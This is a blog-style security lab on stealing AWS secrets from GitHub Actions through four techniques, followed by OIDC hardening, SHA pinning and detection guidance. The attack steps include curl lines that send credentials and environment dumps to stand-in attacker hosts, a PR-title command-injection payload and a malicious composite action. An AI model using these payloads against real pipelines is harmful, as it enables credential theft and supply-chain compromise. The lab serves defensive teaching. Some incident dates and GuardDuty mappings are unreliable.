---
layout: post
title: "Lab — CI/CD Pipeline Attack: GitHub Actions Secret Theft and OIDC Hardening"
date: 2026-06-26T10:00:00
categories:
  - AWS Security Labs
  - Pipeline Security lab
tags:
  - aws
  - github-actions
  - cicd
  - oidc
  - secrets
  - supply-chain
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating four ways to steal AWS credentials from GitHub Actions pipelines — pull_request_target exploitation, workflow injection, command injection, and malicious actions — then replacing all long-lived keys with OIDC to eliminate the attack surface entirely.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Steal AWS credentials stored as GitHub Actions secrets using four different attack techniques — all from a normal-looking GitHub pull request.
Then replace every long-lived key with OIDC federation so there are no secrets left to steal.

**Use a repository and AWS account you own.**

---

## Why CI/CD Is the Most Dangerous Attack Surface

The first three labs required you to exploit a running server.
This lab requires only a GitHub account and the ability to open a pull request.

CI/CD pipelines are trusted with the highest-privilege credentials in your environment — production deployment keys, container registry passwords, Terraform state access.
They run code from pull requests.
And pull requests come from anyone.

The attack surface:
- A misconfigured workflow runs attacker-controlled code with access to your secrets
- A single expression injection turns a PR title into a command that prints your AWS keys to the logs
- A pinned action version that gets force-pushed becomes a supply chain attack

This is how real-world breaches happen in developer-facing infrastructure.
Codecov (2021), Dependency Confusion (2021), and dozens of smaller incidents all trace back to CI/CD trust misconfigurations.

---

## What You Will Learn

- How GitHub Actions secrets are exposed to workflow runs — and when they are not
- Four distinct attack paths that extract secrets from pipelines
- How `pull_request_target` creates a privileged execution context that most developers don't understand
- Why OIDC is fundamentally safer than stored secrets
- How to harden workflows so none of these attacks work

---

## Lab Architecture

```
GitHub Repository (public or private)
    │
    ├── .github/workflows/deploy.yml   ← vulnerable workflow
    ├── .github/workflows/pr-check.yml ← pull_request_target misconfiguration
    └── src/                           ← application code

GitHub Secrets:
    AWS_ACCESS_KEY_ID     → stored long-lived IAM key
    AWS_SECRET_ACCESS_KEY → stored long-lived IAM key

AWS Account:
    IAM User: github-actions-deployer (AdministratorAccess — overprivileged)
    S3 Bucket: production-deploy-bucket
    ECS Service: production-app
```

---

## Phase 0 — Setup

### Step 0.1 — Create the IAM User with Long-Lived Keys

```bash
aws iam create-user --user-name github-actions-deployer

aws iam attach-user-policy \
  --user-name github-actions-deployer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam create-access-key --user-name github-actions-deployer
# Save AccessKeyId and SecretAccessKey
```

> 📸 **SCREENSHOT:** IAM console showing github-actions-deployer user with AdministratorAccess and an active access key

### Step 0.2 — Create a GitHub Repository

Create a new public GitHub repository called `cicd-lab-target`.
Add the AWS credentials as GitHub secrets:

```
Repository → Settings → Secrets and variables → Actions → New repository secret

Name: AWS_ACCESS_KEY_ID
Value: AKIAIOSFODNN7EXAMPLE

Name: AWS_SECRET_ACCESS_KEY
Value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

> 📸 **SCREENSHOT:** GitHub repository Secrets page showing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY configured

### Step 0.3 — Add the Vulnerable Workflows

Create `.github/workflows/deploy.yml`:

```yaml
name: Deploy

on:
  push:
    branches: [main]
  pull_request:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: eu-west-1

      - name: Run tests
        run: npm test

      - name: Deploy to S3
        run: aws s3 sync ./dist s3://production-deploy-bucket
```

Create `.github/workflows/pr-check.yml` — the deliberately misconfigured one:

```yaml
name: PR Check

# VULNERABLE: pull_request_target runs in the context of the BASE branch
# with access to secrets — even for PRs from forks
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v3
        with:
          # VULNERABLE: checking out the PR's code (attacker-controlled)
          # while running with base branch permissions (has secrets)
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: eu-west-1

      - name: Run PR checks
        run: bash ./scripts/check.sh
```

Push both files to the `main` branch of the repo.

> 📸 **SCREENSHOT:** GitHub repository showing both workflow files in `.github/workflows/`

---

## Attack 1 — `pull_request_target` Exploitation

### Why This Is Dangerous

GitHub has two pull request triggers:

| Trigger | Runs in context of | Has secrets? | Checkout |
|---------|-------------------|--------------|---------|
| `pull_request` | Fork/PR branch | No | Safe |
| `pull_request_target` | Base branch | **Yes** | Dangerous if PR code is checked out |

`pull_request_target` was designed for workflows that need secrets to post comments or update PR status.
The danger is when you checkout the PR's code AND have secrets — you are running the attacker's code with your production credentials.

### The Attack

Fork `cicd-lab-target` to your attacker GitHub account.
In the fork, modify `scripts/check.sh`:

```bash
#!/bin/bash

# Normal-looking check script that also exfiltrates secrets
echo "Running code quality checks..."

# Exfiltrate AWS credentials to attacker-controlled server
curl -s "https://attacker-webhook.example.com/steal" \
  -d "key=$AWS_ACCESS_KEY_ID&secret=$AWS_SECRET_ACCESS_KEY&token=$AWS_SESSION_TOKEN"

# Or use the credentials directly to enumerate
aws sts get-caller-identity
aws iam list-users
aws s3 ls

# Continue looking normal
echo "Checks passed"
exit 0
```

Open a pull request from the fork to the original repo.

When the PR is opened, `pr-check.yml` triggers:
1. It runs in the base branch context — has secrets
2. It checks out your PR code — your modified `check.sh`
3. It runs `bash ./scripts/check.sh` — which is now your attacker script
4. Your script receives `$AWS_ACCESS_KEY_ID` and `$AWS_SECRET_ACCESS_KEY` as environment variables
5. The credentials are POSTed to your server

> 📸 **SCREENSHOT:** GitHub Actions run log showing the pr-check workflow running on the fork's PR, with the aws sts get-caller-identity output visible in the logs

**What the attacker receives:**

```json
{
  "key": "AKIAIOSFODNN7EXAMPLE",
  "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}
```

**GuardDuty finding:**

```
UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
Discovery:IAMUser/AnomalousBehavior
```

Credentials used from an unexpected IP (attacker's server) triggers anomalous behavior detection.

---

## Attack 2 — Workflow File Modification via PR

### How It Works

The default `pull_request` trigger (not `pull_request_target`) does NOT have access to secrets for fork PRs.
But if you can modify a workflow file itself in a PR, and if the repo allows workflow changes from contributors, you can change what the workflow does.

**This works against private repos where you are a contributor with write access to your own branch.**

In your fork or branch, modify `.github/workflows/deploy.yml`:

```yaml
name: Deploy

on:
  push:
    branches: [main]
  pull_request:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: eu-west-1

      # Added by attacker — looks like a debug step
      - name: Debug environment
        run: |
          echo "Debugging pipeline configuration..."
          env | grep -i aws | base64
          curl -s https://attacker-webhook.example.com/env \
            -d "$(env | grep -i aws | base64)"

      - name: Run tests
        run: npm test

      - name: Deploy to S3
        run: aws s3 sync ./dist s3://production-deploy-bucket
```

Submit this as a PR.
If a maintainer reviews only the code changes and approves without scrutinizing the workflow diff, the malicious step runs on the next push to main.

> 📸 **SCREENSHOT:** GitHub PR diff showing the added "Debug environment" step that looks innocuous but exfiltrates credentials

**Defense:** Require separate approval for workflow file changes.
GitHub allows this via branch protection rules → "Require approval from code owners" with a `CODEOWNERS` file:

```
# .github/CODEOWNERS
.github/workflows/ @security-team
```

---

## Attack 3 — Expression Injection via PR Title

### How It Works

GitHub Actions expressions `${{ }}` are evaluated before the shell runs the command.
If an expression includes user-controlled input — like a PR title, branch name, or commit message — the attacker can inject shell commands.

Add this step to a workflow:

```yaml
# VULNERABLE — interpolates PR title directly into shell
- name: Notify about PR
  run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
    curl -s https://internal-api/notify \
      -d "title=${{ github.event.pull_request.title }}"
```

### The Attack

Open a PR with this title:

```
Fix bug"; curl https://attacker.com/steal -d "$(env | base64)"; echo "
```

When the workflow runs, the expression is substituted before the shell sees it:

```bash
# What the runner actually executes after substitution:
echo "Processing PR: Fix bug"; curl https://attacker.com/steal -d "$(env | base64)"; echo ""
```

The injected `curl` command runs in the same environment that has `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` set — they are in `env` output.

> 📸 **SCREENSHOT:** GitHub Actions log showing the injected command executing and the curl running — with environment variables being sent

**Fix — use an environment variable as an intermediary:**

```yaml
# SAFE — expression assigned to env var first, shell sees it as a literal string
- name: Notify about PR
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Processing PR: $PR_TITLE"
    curl -s https://internal-api/notify -d "title=$PR_TITLE"
```

When `${{ }}` is assigned to an `env:` key, the value is passed as a shell variable.
The shell does not re-evaluate it as a command — injection is impossible.

**Every place you use `${{ github.event.* }}` directly in a `run:` block is an injection risk.**
Safe inputs: `github.sha`, `github.run_id`, `github.repository`.
Dangerous inputs: `github.event.pull_request.title`, `github.event.pull_request.body`, `github.event.pull_request.head.ref`, `github.actor`.

---

## Attack 4 — Malicious Third-Party Action

### How It Works

GitHub Actions steps reference actions by `owner/repo@version`.
If you pin to a tag (`@v3`) instead of a commit SHA, the action owner can move the tag to a different commit — silently changing what code runs in your pipeline.

This is not theoretical — the `reviewdog/action-setup@v1` tag was moved to a malicious commit in 2023 that exfiltrated secrets.

```yaml
# VULNERABLE — tag can be moved by the action owner
- uses: some-action/do-thing@v2

# VULNERABLE — branch can be modified
- uses: some-action/do-thing@main

# SAFE — commit SHA is immutable
- uses: some-action/do-thing@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
```

### Simulate the Attack

Create a GitHub repository called `evil-action` with this `action.yml`:

```yaml
name: Evil Action
description: Looks like a linting tool
runs:
  using: composite
  steps:
    - name: Run lint
      shell: bash
      run: |
        echo "Running linter..."
        # Exfiltrate all environment variables
        curl -s https://attacker-webhook.example.com/action-steal \
          -d "$(env | base64)"
        echo "Lint passed"
```

Publish it as a GitHub Action.
If your target repo uses `your-username/evil-action@v1` and you move the `v1` tag to this malicious commit, every pipeline run now exfiltrates credentials.

> 📸 **SCREENSHOT:** GitHub showing the evil-action repository with the malicious action.yml, and the workflow using it with a tag reference

**Fix — pin every action to a full commit SHA:**

```yaml
# Before (vulnerable)
- uses: actions/checkout@v3
- uses: aws-actions/configure-aws-credentials@v2

# After (safe — SHA pinning)
- uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9        # v3.5.3
- uses: aws-actions/configure-aws-credentials@5fd3084fc36e372ff1beb9153e7ca6c60a21041e  # v2.2.0
```

Use a tool like **Dependabot** or **pin-github-action** to automate SHA pinning:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

---

## Defense — Replace All Long-Lived Keys with OIDC

All four attacks above steal `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`.
OIDC eliminates these credentials entirely — there is nothing to steal.

### How OIDC Works

```
GitHub Actions runner
    │
    │  1. Request OIDC token from GitHub's token endpoint
    │     Token contains: repo name, branch, workflow, actor
    ▼
GitHub's OIDC provider (token.actions.githubusercontent.com)
    │
    │  2. Sign and return a JWT (valid for 1 hour, scoped to this run)
    ▼
GitHub Actions runner
    │
    │  3. Exchange JWT for temporary AWS credentials via sts:AssumeRoleWithWebIdentity
    ▼
AWS STS
    │
    │  4. Verify JWT signature against GitHub's JWKS endpoint
    │     Validate claims: audience, issuer, repo, branch
    ▼
    │  5. Return temporary credentials (valid for 1 hour maximum)
    ▼
GitHub Actions runner uses temporary credentials
    │
    │  6. Credentials expire automatically — no revocation needed
```

No stored secrets anywhere.
Even if an attacker intercepts the OIDC token, it is valid for one run only and cannot be reused outside the STS exchange.

### Step 1 — Create the IAM OIDC Provider

```bash
# Get GitHub's OIDC thumbprint
THUMBPRINT=$(curl -s https://token.actions.githubusercontent.com/.well-known/openid-configuration \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['jwks_uri'])" \
  | xargs curl -sv 2>&1 \
  | grep -A1 "SHA-256" \
  | tail -1 \
  | tr -d ' :' \
  | tr 'A-F' 'a-f')

# Create the OIDC provider in IAM
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list $THUMBPRINT
```

### Step 2 — Create the IAM Role for GitHub Actions

The trust policy is where you restrict which repos, branches, and environments can assume this role.

```bash
cat > github-actions-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": [
            "repo:YOUR_GITHUB_ORG/cicd-lab-target:ref:refs/heads/main",
            "repo:YOUR_GITHUB_ORG/cicd-lab-target:environment:production"
          ]
        }
      }
    }
  ]
}
EOF

aws iam create-role \
  --role-name github-actions-deploy-role \
  --assume-role-policy-document file://github-actions-trust.json

aws iam attach-role-policy \
  --role-name github-actions-deploy-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess
```

The `sub` condition locks the role to:
- Only the `cicd-lab-target` repo in your org
- Only the `main` branch OR the `production` environment
- Pull requests from forks cannot assume this role — their `sub` claim is different

### Step 3 — Update the Workflow to Use OIDC

Delete `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` from GitHub Secrets.
Update the workflow:

```yaml
name: Deploy (OIDC)

on:
  push:
    branches: [main]

permissions:
  id-token: write   # Required: allows the workflow to request OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # Required: matches the sub condition in IAM role

    steps:
      - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9  # v3.5.3

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@5fd3084fc36e372ff1beb9153e7ca6c60a21041e  # v2.2.0
        with:
          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-actions-deploy-role
          aws-region: eu-west-1
          # No access-key-id or secret-access-key — OIDC handles everything

      - name: Verify identity
        run: aws sts get-caller-identity

      - name: Deploy to S3
        run: aws s3 sync ./dist s3://production-deploy-bucket
```

> 📸 **SCREENSHOT:** GitHub Actions run showing the OIDC authentication step succeeding with "Assuming role with OIDC" in the logs, and `aws sts get-caller-identity` showing the assumed role

### Step 4 — Verify the Attack No Longer Works

Repeat Attack 1 — open a PR from a fork with a malicious `check.sh`:

```bash
# Attacker's check.sh
echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
```

Output in the Actions log:

```
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
```

Both variables are empty — they no longer exist.
The OIDC credentials (`AWS_SESSION_TOKEN`) are present but scoped to this exact run and expire in one hour.
There is nothing persistent to steal.

> 📸 **SCREENSHOT:** GitHub Actions log showing empty AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY — proof that OIDC has eliminated the attack surface

---

## Defense Stack — Hardened Workflow Template

```yaml
name: Secure Deploy Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    # NOTE: pull_request (not pull_request_target) — no secrets for fork PRs

permissions:
  id-token: write
  contents: read
  pull-requests: read

jobs:
  security-checks:
    runs-on: ubuntu-latest
    # No AWS credentials for PR checks — only for deployments
    steps:
      - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9  # SHA pinned

      # Use env: for all user-controlled input — never ${{ github.event.* }} in run:
      - name: Run checks
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.actor }}
        run: |
          echo "Checking PR by: $PR_AUTHOR"
          npm run lint
          npm test

  deploy:
    runs-on: ubuntu-latest
    needs: security-checks
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    environment: production   # Requires manual approval in GitHub Environments

    steps:
      - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@5fd3084fc36e372ff1beb9153e7ca6c60a21041e
        with:
          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-actions-deploy-role
          aws-region: eu-west-1

      - name: Deploy
        run: aws s3 sync ./dist s3://production-deploy-bucket
```

---

## Detection — What Catches Each Attack

### GuardDuty

| Attack | GuardDuty finding |
|--------|------------------|
| Stolen key used from unexpected IP | `UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B` |
| Credential used from GitHub's IP range | `Discovery:IAMUser/AnomalousBehavior` |
| Mass enumeration after theft | `Discovery:IAMUser/AnomalousBehavior` |
| New persistent access key created | `Persistence:IAMUser/AnomalousBehavior` |

### CloudTrail Signals to Watch

```bash
# Find API calls from GitHub Actions IP ranges
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity \
  --start-time 2026-06-26T00:00:00Z

# Find suspicious calls made with your IAM user keys
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=github-actions-deployer \
  --start-time 2026-06-26T00:00:00Z | \
  python3 -m json.tool | grep sourceIPAddress
```

If the `sourceIPAddress` in CloudTrail is not in [GitHub's IP ranges](https://api.github.com/meta), the credentials are being used outside the pipeline.

### GitHub Audit Log

GitHub logs every workflow run, secret access, and environment approval.
In your org settings → Audit log, filter for:

```
action:secrets.access
action:workflows.run_triggered_from_fork
```

> 📸 **SCREENSHOT:** GitHub Audit Log showing secret access events with timestamps and actors

---

## Full Comparison — Before and After OIDC

| | Long-lived keys | OIDC |
|---|----------------|------|
| **What is stored in GitHub** | Static `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` | Nothing |
| **Credential lifetime** | Permanent until manually rotated | 1 hour maximum |
| **If stolen** | Attacker has permanent access | Attacker has 1-hour access, cannot reuse |
| **fork PR access** | Keys present in `pull_request_target` context | No keys to expose |
| **Rotation required** | Yes — manual, often forgotten | No — automatic per run |
| **Blast radius if repo compromised** | Full account access until keys revoked | Current run only |
| **Privilege scope** | Whatever the IAM user has | Locked by trust policy to specific repo/branch/environment |

---

## Key Takeaways

- `pull_request_target` is the most common misconfiguration in GitHub Actions — it gives fork PRs the same secret access as your main branch
- Expression injection via `${{ github.event.pull_request.title }}` in `run:` blocks is an easy mistake that hands attackers a shell with your credentials
- OIDC eliminates the entire attack surface by removing stored credentials — there is nothing to steal because credentials are generated per-run and expire in one hour
- Pin actions to commit SHAs — tags are mutable and have been weaponized in real supply chain attacks
- The `sub` claim in the OIDC trust policy is your access control — lock it to specific repos, branches, and environments, never use a wildcard

---

## Cleanup

```bash
# Delete the IAM user and keys
aws iam detach-user-policy \
  --user-name github-actions-deployer \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam delete-access-key \
  --user-name github-actions-deployer \
  --access-key-id AKIAIOSFODNN7EXAMPLE

aws iam delete-user --user-name github-actions-deployer

# Delete the OIDC role
aws iam detach-role-policy \
  --role-name github-actions-deploy-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess

aws iam delete-role --role-name github-actions-deploy-role

# Delete the OIDC provider
aws iam delete-open-id-connect-provider \
  --open-id-connect-provider-arn \
  arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com

# Remove secrets from GitHub repo
# Repository → Settings → Secrets → Delete AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
